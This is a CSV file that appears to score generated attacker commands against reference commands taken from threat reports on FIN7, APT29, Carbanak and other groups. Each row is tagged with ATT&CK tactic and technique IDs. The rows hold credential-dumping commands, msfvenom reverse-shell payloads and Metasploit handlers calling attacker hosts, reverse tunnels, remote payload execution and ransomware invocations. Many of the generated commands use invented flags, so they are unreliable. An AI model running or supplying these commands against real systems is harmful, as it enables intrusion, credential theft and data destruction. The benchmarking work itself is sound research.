report,file,tool,input_command,matched_command,edit_score,match_found
FIREEYE4_FIN7,command_rubeus_TA0009_T1113.txt,rubeus,rubeus logonsession /screenshot,`rubeus.exe kerberoast /domain:oz.local`,"0,282",True
FIREEYE4_FIN7,command_ryuk_TA0004_T1055.txt,ryuk,ryuk.exe /inject <target_process_name>,`ryuk.exe --encrypt --process-name notepad.exe`,"0,565",True
FIREEYE4_FIN7,command_ryuk_TA0005_T1055.txt,ryuk,ryuk.exe --inject <process_name>,`ryuk.exe --encrypt --process-name notepad.exe`,"0,658",True
FIREEYE5_FIN7,command_adfind_TA0003_T1546.txt,adfind,"adfind -sc adobjcnt:fsp -base CN=Foreign Security Principals,CN=Schema,CN=Configuration","adfind -f ""(objectcategory=group)""`","0,344",True
FIREEYE5_FIN7,command_adfind_TA0004_T1546.txt,adfind,"adfind -b CN=Application Shim Database,CN=Schema,CN=Configuration,DC=example,DC=com -ds -showdel",`adfind.exe -f (objectcategory=person) > ad_users.txt`,"0,293",True
FIREEYE5_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords.exe -c > shim_database_file.sdb,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,381",True
FIREEYE5_FIN7,command_invoke_psimage_TA0002_T1106.txt,invoke psimage,Invoke-PSImage -ScriptBlock {RtlDecompressBuffer} -OutputFile,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,525",True
FIREEYE5_FIN7,command_invoke_psimage_TA0003_T1543.txt,invoke psimage,Invoke-PSImage -Script <malicious_payload_script> -Out <new_image_file>.png -Image <existing_image_file>,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,511",True
FIREEYE5_FIN7,command_invoke_psimage_TA0004_T1543.txt,invoke psimage,Invoke-PSImage -Script .\T1543.ps1 -Out .\system-process.ps1 -WebRequest,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,579",True
FIREEYE5_FIN7,command_pupy_TA0004_T1055.txt,pupy,gen -f client -O windows -A x64 connect --host <ip>:<port> -t transport,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"0,617",True
FIREEYE5_FIN7,command_pupy_TA0005_T1055.txt,pupy,gen -f dll connect --host <target_ip>:<port> -t <transport>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"0,4",True
FIREEYE6_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
FIREEYE6_FIN7,command_invoke_psimage_TA0003_T1547.txt,invoke psimage,Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\startup.exe -Startup,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,566",True
FIREEYE6_FIN7,command_invoke_psimage_TA0004_T1547.txt,invoke psimage,Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\startup.png -Image .\kiwi.jpg -Startup,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,682",True
FIREEYE6_FIN7,command_wmic_TA0007_T1057.txt,wmic,wmic path win32_process get name,"`wmic /node:#{""POS system""} process call create #{""executable""}`","0,417",True
FIREEYE6_FIN7,command_wmic_TA0009_T1018.txt,wmic,"wmic path win32_process get processid, name, executablepath /value","`wmic /node:#{""POS system""} process call create #{""executable""}`","0,431",True
FIREEYE6_FIN7,command_wmic_TA0009_T1082.txt,wmic,"wmic path win32_process get name,processid,caption /format:value","`wmic /node:#{""POS system""} process call create #{""executable""}`","0,375",True
FORCEPOINT_CARBANAK,command_chrome_passwords_TA0011_T1102.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
FORCEPOINT_CARBANAK,command_plink_TA0002_T1071.txt,plink,"plink.exe -load mysession -o ""POST /path/to/web/protocol"" -v",`plink.exe <domain_admin>@<bankfileserver_ip>`,"0,34",True
FORCEPOINT_CARBANAK,command_plink_TA0011_T1071.txt,plink,"plink.exe login.example.com -l fred -v ""POST / HTTP/1.1"" -batch",`plink.exe <domain_admin>@<bankfileserver_ip>`,"0,349",True
FORCEPOINT_CARBANAK,command_plink_TA0011_T1105.txt,plink,plink -batch -ssh ggldr@<google_service_url>,"```sh
plink -ssh #{user}@#{server}
```","0,463",True
FORK_APT29,command_chrome_passwords_TA0009_T1114.txt,chrome passwords,chrome-passwords -p <file_path_to_chrome_user_data>,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,333",True
FORK_APT29,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,"Invoke-PSImage -Embed -InputFile ""<obfuscated_script.png>"" -OutputFile ""<output.png>""",`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,4",True
FORK_APT29,command_metasploit_TA0011_T1102.txt,metasploit,msfconsole -r <task_database_file>,`sudo msfconsole`,"0,392",True
FORK_APT29,command_plink_TA0010_T1048.txt,plink,plink.exe -no-sanitise-stdout -ssh <victim_ssh_user>@<victim_ssh_ip>,`plink.exe <domain_admin>@<bankfileserver_ip>`,"0,404",True
FORK_APT29,command_plink_TA0011_T1071.txt,plink,plink.exe -telnet <CnC_Server_IP> -P <port_number>,`plink.exe <domain_admin>@<bankfileserver_ip>`,"0,375",True
FORK_APT29,command_psexec_TA0011_T1105.txt,psexec,psexec \\<CnC_Server_IP> -s -u <username> -v <file_path>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","0,296",True
FORK_APT29,command_rubeus_TA0005_T1070.txt,rubeus,rubeus.exe kill,`rubeus.exe kerberoast /domain:oz.local`,"0,545",True
FORK_APT29,command_rubeus_TA0006_T1558.txt,rubeus,rubeus.exe klist /service:krbtgt,`rubeus.exe kerberoast /domain:oz.local`,"0,5",True
FORTINET_OILRIG,command_ryuk_TA0002_T1105.txt,ryuk,ryuk.exe --drop-bat-files,`ryuk.exe --encrypt --process-name notepad.exe`,"0,417",True
FORTINET_OILRIG,command_wmic_TA0002_T1047.txt,wmic,wmic /node:<c2_server_ip> /namespace:\\root\cimv2 path Win32_PingResult call Ping,"`wmic /node:#{""POS system""} process call create #{""executable""}`","0,29",True
GIGAMON1_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
GIGAMON1_FIN7,command_chrome_passwords_TA0002_T1204.txt,chrome passwords,chrome-passwords.exe -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,5",True
GIGAMON1_FIN7,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,"Invoke-PSImage -ScriptData ""base64:<part1_base64_encoded_string_here>"" -OutputFile <image_file_1>.png",`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,453",True
GIGAMON2_FIN7,command_adfind_TA0005_T1112.txt,adfind,"adfind -b <domain> -f ""(|(sAMAccountType=805306144)(|msDS-User-Account-Control-Computed:2))"" -dn <target_user>",`adfind.exe -f (objectcategory=computer) > ad_computers.txt`,"0,318",True
GIGAMON2_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
GIGAMON2_FIN7,command_chrome_passwords_TA0009_T1005.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
GIGAMON2_FIN7,command_invoke_psimage_TA0003_T1546.txt,invoke psimage,Invoke-PSImage -Script .\shim.ps1 -Out .\shim.png -Image .\shield.jpg,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,779",True
GIGAMON2_FIN7,command_psexec_TA0005_T1620.txt,psexec,"psexec \\target_machine -accepteula -nobanner -l -priority high cmd /c start /b ""path_to_dll"" /a /w","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","0,293",True
GIGAMON2_FIN7,command_psexec_TA0007_T1057.txt,psexec,psexec \\<target_computer> -u Administrator -p <password> -s cmd /c tasklist,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","0,329",True
GIGAMON3_FIN7,command_plink_TA0011_T1071.txt,plink,plink -shareexists <dns_tunnel_session>,`plink.exe <domain_admin>@<bankfileserver_ip>`,"0,447",True
GIGAMON3_FIN7,command_rubeus_TA0005_T1027.txt,rubeus,rubeus asktgs /ticket:<base64(ticket.kirbi)> /enc:aes256,`rubeus.exe kerberoast /domain:oz.local`,"0,312",True
GRIZZLY_APT29,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,Invoke-PSImage -Script { Get-Content -Path <file_path> -ErrorAction SilentlyContinue },`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,458",True
GRIZZLY_APT29,command_psexec_TA0002_T1204.txt,psexec,psexec -l <user_name> <target_system>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","0,225",True
GRIZZLY_APT29,command_psexec_TA0011_T1105.txt,psexec,psexec \\<target_computer> -u <username> -p <password> cmd /c powershell.exe -ExecutionPolicy Bypass -File <ransomware_dll_path>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","0,319",True
InsideTheBreach_FIN6,command_chrome_passwords_TA0000_T1056.txt,chrome passwords,chrome --password-store=browser --capture-form-data <form_data_file_path>,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,277",True
INTEZER_OILRIG,command_chrome_passwords_TA0005_T1027.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
KASPERKY1_FIN7,command_chrome_passwords_TA0009_T1185.txt,chrome passwords,chrome-passwords -p > output.txt,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,404",True
KASPERKY1_FIN7,command_metasploit_TA0002_T1203.txt,metasploit,"msfconsole -x ""use exploit/windows/fileformat/ms03_026"" -x ""set payload windows/meterpreter/reverse_tcp"" -x ""set RHOST <target_ip>"" -x ""set RPORT 445"" -x ""exploit""","```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
```","0,524",True
KASPERKY1_FIN7,command_metasploit_TA0011_T1105.txt,metasploit,msfvenom -p windows/meterpreter/reverse_tcp <initial_downloader Payload> LHOST=<attacker_ip> LPORT=<attacker_port>,`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 --format psh -o meterpreter.ps1`,"0,652",True
KASPERKY2_FIN7,command_adfind_TA0007_T1082.txt,adfind,"adfind -b <domain_name> -f ""(&(objectCategory=Computer)(operatingSystem=*))"" -r",`adfind.exe -f (objectcategory=computer) > ad_computers.txt`,"0,576",True
KASPERKY2_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
KASPERKY2_FIN7,command_invoke_psimage_TA0011_T1105.txt,invoke psimage,Invoke-PSImage -Script .\GRIFFON_Implant_Installer.ps1 -Out <installer_payload.png> -Image <existing_image.jpg> -WebRequest,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,591",True
KASPERKY2_FIN7,command_paexec_TA0007_T1016.txt,paexec,PAExec @computers.txt -u <domain_admin> -p <password> -i -c ipconfig /all," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","0,456",True
KASPERKY2_FIN7,command_pupy_TA0001_T1078.txt,pupy,run loot_memory browser_process_id,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`","0,25",True
KASPERKY2_FIN7,command_pupy_TA0003_T1078.txt,pupy,run hashmon /path/to/process/memory,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`","0,23",True
KASPERKY2_FIN7,command_pupy_TA0004_T1078.txt,pupy,loot_memory --browser=browser_name,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`","0,321",True
KASPERKY2_FIN7,command_pupy_TA0005_T1078.txt,pupy,run Lazagne,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`","0,135",True
KASPERKY2_FIN7,command_ryuk_TA0003_T1547.txt,ryuk,"ryuk -e --process-name ""GRIFFON"" --drop-bat-files",`ryuk.exe --encrypt --process-name notepad.exe`,"0,521",True
KASPERKY2_FIN7,command_ryuk_TA0004_T1547.txt,ryuk,ryuk.exe --process-name <process_name> -e,`ryuk.exe --encrypt --process-name notepad.exe`,"0,614",True
KASPERKY2_FIN7,command_wmic_TA0002_T1047.txt,wmic,"wmic process call create ""notepad.exe""","`wmic /node:#{""POS system""} process call create #{""executable""}`","0,588",True
KASPERKY3_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
KASPERKY3_FIN7,command_chrome_passwords_TA0011_T1105.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
KASPERKY3_FIN7,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,invoke-psimage -d -i <existing_image_file> -o <output_png>,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,362",True
KASPERKY3_FIN7,command_plink_TA0011_T1071.txt,plink,plink.exe -no-antispoof -batch <attacker_sql_user>@<sql_server_ip>,`plink.exe <domain_admin>@<bankfileserver_ip>`,"0,482",True
KASPERSKY1_CARBANAK,command_chrome_passwords_TA0009_T1056.txt,chrome passwords,chrome-passwords -p <file_path_to_chrome_database>,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,336",True
KASPERSKY2_CARBANAK,command_metasploit_TA0002_T1203.txt,metasploit,msfconsole -r exploit.rb,`sudo msfconsole`,"0,488",True
KASPERSKY2_CARBANAK,command_psexec_TA0001_T1078.txt,psexec,psexec \-u <domain>\user2 \-p <password> -i 0 \\remote_system,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","0,386",True
KASPERSKY2_CARBANAK,command_psexec_TA0005_T1078.txt,psexec,psexec \\remote_system -u Domain\user1 -p <password>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","0,311",True
KASPERSKY2_CARBANAK,command_pupy_TA0004_T1055.txt,pupy,download C:\\Windows\\System32\\svchost.exe,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`","0,321",True
KASPERSKY2_CARBANAK,command_pupy_TA0004_T1134.txt,pupy,privesc_checker -s <os_type> -f <file_path>,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`","0,214",True
KASPERSKY2_CARBANAK,command_pupy_TA0005_T1055.txt,pupy,run memory_exec C:\\Windows\\System32\\svchost.exe privilege::debug,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`","0,276",True
KASPERSKY2_CARBANAK,command_pupy_TA0005_T1070.txt,pupy,pupy find /path/to/directory/ -type f -exec rm {} \;,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"0,252",True
KASPERSKY2_CARBANAK,command_pupy_TA0005_T1134.txt,pupy,getsystem <windows_system_privilege>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"0,252",True
MAGECART_FIN6,command_chrome_passwords_TA0011_T1056.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,438",True
MAGECART_FIN6,command_metasploit_TA0001_T1190.txt,metasploit,msfvenom -p windows/x86/shell_reverse_tcp LHOST=192.168.1.123 LPORT=4444 -e x86/shikata_ga_nai -f exe > payload.exe,`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 -f exe-service -o javamtsup.exe`,"0,561",True
MappingMitreToSandwormAPT_SANDWORM,command_chrome_passwords_TA0006_T1552.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
MappingMitreToSandwormAPT_SANDWORM,command_ryuk_TA0005_T1070.txt,ryuk,ryuk.exe --stop-services,`ryuk.exe --encrypt --process-name notepad.exe`,"0,451",True
MappingMitreToSandwormAPT_SANDWORM,command_ryuk_TA0011_T1001.txt,ryuk,ryuk.exe -p <process_name>,`ryuk.exe --encrypt --process-name notepad.exe`,"0,63",True
MappingMitreToSandwormAPT_SANDWORM,command_ryuk_TA0040_T1490.txt,ryuk,ryuk.exe /delete-backups,`ryuk.exe --encrypt --process-name notepad.exe`,"0,394",True
MappingMitreToSandwormAPT_SANDWORM,command_windows_credential_editor_TA0006_T1003.txt,windows credential editor,wce -w,"```sh
wce.exe -w
```","0,462",True
MAZE_FIN6,command_psexec_TA0003_T1078.txt,psexec,psexec -u <domain_admin_account> -p <password> \\remote_system -s,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","0,336",True
MICROSOFT_APT29,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
MICROSOFT_APT29,command_paexec_TA0011_T1219.txt,paexec,paexec -h -i -c <dll_name>," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","0,226",True
MICROSOFT_APT29,command_plink_TA0011_T1071.txt,plink,"plink.exe -i ""<private_key_file>"" <attacker_ssh_user>@<server_ip> -R 80:localhost:80","`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","0,649",True
MICROSOFT_APT29,command_psexec_TA0011_T1105.txt,psexec,psexec \\<target_computer> -s -nobanner -accepteula -c <file_path>\cyzfc.dat,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","0,23",True
MoreEggs_FIN6,command_adfind_TA0043_T1589.txt,adfind,adfind -sc adinfo -binary,"adfind -f ""(objectcategory=group)""`","0,433",True
MoreEggs_FIN6,command_windows_credential_editor_TA0002_T1059.txt,windows credential editor,wce -l,"```sh
wce.exe -w
```","0,385",True
MORPHISEC_FIN6,command_metasploit_TA0004_T1055.txt,metasploit,msfpayload -p windows/meterpreter/reverse_tcp_lport=<lport> -e base64 -i encode_final_payload,`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 -f exe-service -o javamtsup.exe`,"0,485",True
MORPHISEC_FIN6,command_metasploit_TA0005_T1055.txt,metasploit,"msfpayload windows/shell/reverse_tcp -f powershell -X 32 -c ""encode_final_payload"" -o remove_comspec -p <shellcode>",`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 --format psh -o meterpreter.ps1`,"0,351",True
MORPHISEC_FIN6,command_metasploit_TA0011_T1219.txt,metasploit,use auxiliary/scanner/telnet/lantronix_telnet_password,"```sh
msf> use auxiliary/admin/smb/psexec_ntdsgrab
```","0,37",True
MORPHISEC_FIN6,command_plink_TA0008_T1021.txt,plink,plink.exe -i key attacker_ssh_user@remote_server -R 22:localhost:22,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","0,595",True
MORPHISEC_FIN6,command_rubeus_TA0003_T1547.txt,rubeus,rubeus.exe klist /purge,`rubeus.exe kerberoast /domain:oz.local`,"0,508",True
MORPHISEC_FIN6,command_rubeus_TA0004_T1547.txt,rubeus,rubeus.exe purge /luid:<logon_session_id>,`rubeus.exe kerberoast /domain:oz.local`,"0,469",True
MORPHISEC_FIN6,command_wmic_TA0002_T1047.txt,wmic,"wmic /RECORD:C:\temp\wmi_record.xml; wmic process call ""winmgmt start""; wmic netuse create ""C:\temp\script.ps1""","`wmic /node:#{""POS system""} process call create #{""executable""}`","0,4",True
MORPHISEC_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords.exe,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,519",True
